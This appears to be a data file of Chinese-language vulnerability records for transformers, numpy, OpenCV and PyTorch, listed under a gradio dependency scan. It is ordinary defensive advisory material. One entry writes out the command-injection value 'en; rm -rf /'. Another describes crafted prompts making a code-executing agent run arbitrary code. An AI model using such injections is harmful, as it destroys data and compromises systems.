gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
